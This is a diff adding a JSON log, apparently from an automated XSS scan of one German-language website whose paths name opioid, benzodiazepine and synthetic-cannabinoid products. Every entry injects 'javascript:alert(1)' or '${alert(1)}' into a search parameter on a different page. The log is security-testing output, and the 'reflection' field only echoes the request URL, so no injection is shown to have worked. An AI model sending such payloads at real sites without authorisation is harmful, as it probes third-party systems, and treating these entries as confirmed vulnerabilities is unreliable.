@@ -1,0 +1,317 @@
+[
+    {
+        "timestamp": "2026-08-14T14:15:26.049Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:17:21.629Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:18:02.622Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kontaktieren-sie-uns?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/kontaktieren-sie-uns?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:20:02.501Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kontaktieren-sie-uns?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/kontaktieren-sie-uns?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:20:43.321Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/blogs?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/blogs?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:22:12.345Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/blogs?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/blogs?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:22:43.973Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/wunschliste?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/wunschliste?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:24:07.309Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/wunschliste?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/wunschliste?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:24:41.230Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/warenkorb?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/warenkorb?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:26:04.941Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/warenkorb?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/warenkorb?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:26:39.059Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:28:22.750Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:29:01.629Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/uber-uns?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/uber-uns?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:30:35.534Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/uber-uns?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/uber-uns?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:31:12.555Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/geschaft?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/geschaft?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:32:40.999Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/geschaft?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/geschaft?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:33:23.455Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kategorie/opioide-online-kaufen?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/kategorie/opioide-online-kaufen?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:34:53.561Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kategorie/opioide-online-kaufen?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/kategorie/opioide-online-kaufen?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:35:29.470Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:36:54.548Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:37:29.889Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:38:53.859Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:39:32.878Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:41:06.370Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:41:45.638Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:43:32.549Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:44:13.614Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:45:47.637Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:46:21.734Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/erfahrungsberichte?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/erfahrungsberichte?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:47:54.592Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/erfahrungsberichte?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/erfahrungsberichte?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:48:26.390Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/faqs?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/faqs?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:50:01.883Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/faqs?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/faqs?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:50:41.260Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/seite/datenschutzrichtlinie?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/seite/datenschutzrichtlinie?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:52:16.682Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/seite/datenschutzrichtlinie?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/seite/datenschutzrichtlinie?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:52:53.789Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:54:55.819Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/produkt/5cl-adb-a-online-kaufen?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:55:45.675Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T14:57:56.636Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/produkt/fub-apinaca-online-kaufen?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T14:58:43.718Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/produkt/4fadb-online-kaufen?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/produkt/4fadb-online-kaufen?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T15:00:55.095Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/produkt/4fadb-online-kaufen?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/produkt/4fadb-online-kaufen?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T15:01:52.500Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T15:04:04.258Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T15:04:50.825Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?search=javascript%3Aalert(1)"
+    },
+    {
+        "timestamp": "2026-08-14T15:06:56.592Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?search=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?search=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T15:07:48.623Z",
+        "target_scope": "https://www.gravitychams.com",
+        "exploit_url": "https://www.gravitychams.com/produkt/7-add-online-kaufen?search=javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://www.gravitychams.com/produkt/7-add-online-kaufen?search=javascript%3Aalert(1)"
+    }
+]
